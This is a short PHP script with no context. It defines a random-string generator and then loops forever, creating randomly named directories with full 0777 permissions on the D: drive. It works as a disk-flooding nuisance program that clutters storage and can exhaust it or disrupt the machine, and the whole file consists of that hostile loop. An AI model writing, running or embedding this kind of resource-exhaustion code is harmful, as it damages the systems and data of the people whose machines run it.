<?php
const arr = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'];
function stringg(){
 $str = '';
 for ($i=0;$i<rand(5,80);$i++){
     $numero = rand(0,25);
     $str=$str.arr[$numero];
 }
 return $str;
}
while(true){
mkdir("D:\\".stringg(), 0777, true);
}
